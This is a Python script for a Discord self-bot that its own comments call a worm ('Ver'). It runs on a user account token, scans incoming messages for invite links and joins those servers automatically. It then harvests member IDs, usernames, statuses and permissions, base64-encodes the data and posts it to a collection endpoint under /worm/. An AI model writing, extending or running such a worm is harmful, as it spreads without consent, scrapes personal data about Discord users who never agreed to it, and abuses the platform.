from discord.ext import tasks, commands
import discord
import re
import os
import requests
from dotenv import load_dotenv
from colorama import Fore, init
import base64

###
# Below are ony usefull functions that manipulate dat for example
# Nothing interesting
###
def get_server_data(response_json):
    server_name = response_json["guild"]["name"]
    server_id=response_json["guild"]["id"]

    return {'name':server_name, 'code':server_id}

def get_all_members(client):
    data_members = {'members':[{}, {}]} # This for security reason, I do not trust them *\o/*           
    for member in client.get_all_members():
        print("ID:",member.id," NAME:",member.name,"GUILD:", member.guild, "ACTIVITIES:",member.activities, "STATUS:",member.status,"WEB:",member.web_status,"PERM:",member.guild_permissions)
        tmp = {'id':str(member.id), 'username':member.name, 'server':member.guild.name.replace("'", "\\'")}
        data_members['members'].append(tmp)
    return data_members

# We encode in base64 the data because it is easier to handle in both side of the server
def encode_this_please(message):
    message_bytes = message.encode('utf-8')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('utf-8')
    encoded_message = {'encoded':base64_message}
    return encoded_message

def get_header_for_token(token):
    headers = {
        "authorization": token
    }
    return headers

# Set the token either in .env or directly using : export DISCORD_TOKEN=<token>
def get_discord_token():
    load_dotenv()
    token = os.getenv('DISCORD_TOKEN')
    if token is None:
        print('You need to set a DISCORD_TOKEN env variable')
        exit()
    return token

###
# Let's init and run the 'Ver'
###
init(autoreset=True)

token = get_discord_token()
headers = get_header_for_token(token)
client = commands.Bot(command_prefix=".", self_bot=True)

lst_server = []
lst_user = []

print("[*] 1 minute [*]")


###
# Here are Discord event managing functions
###
# Knowing when the 'Ver' is eady to receive invitations
@client.event
async def on_ready():
    print("[!] Ready to spread [!]")

# Invitation scrapping, joining servers and collect data
@client.event
async def on_message(ctx):
    if "discord.gg/" in ctx.content:
        invite = re.search("discord.gg/(.*)", ctx.content).group(1) # Getting server's ID
        print(Fore.MAGENTA + f"Fetched Invite: {invite} by {ctx.author.name}#{ctx.author.discriminator}") 
        request = requests.post(f"https://discordapp.com/api/v6/invites/{invite}", headers=headers) # Joining the server
        if "name" in request.text: # Collecting the data
            try:
                # Server related data
                response_json = request.json()
                data_server = get_server_data(response_json)
                api = requests.post(f"http://127.0.0.1:8000/worm/server/", data=data_server) # Store it in a remote database

                # Users related data
                data_members = get_all_members(client)                
                api = requests.post(f"http://127.0.0.1:8000/worm/person/", data=encode_this_please(str(data_members))) # Store it in a remote database

            except KeyError:
                print(Fore.LIGHTBLACK_EX + "Couldn't join the server")
        elif "Maximum number of guilds reached" in request.text:
            print(Fore.RED + "Maximum number of guilds reached")
        elif "banned" in request.text:
            print(Fore.RED + "You are banned from the discord") # Sometimes it happens 
        else:
            print("Unkown error :")
            print(request.text)


###
# Let's run 
###
client.run(token, bot=False)
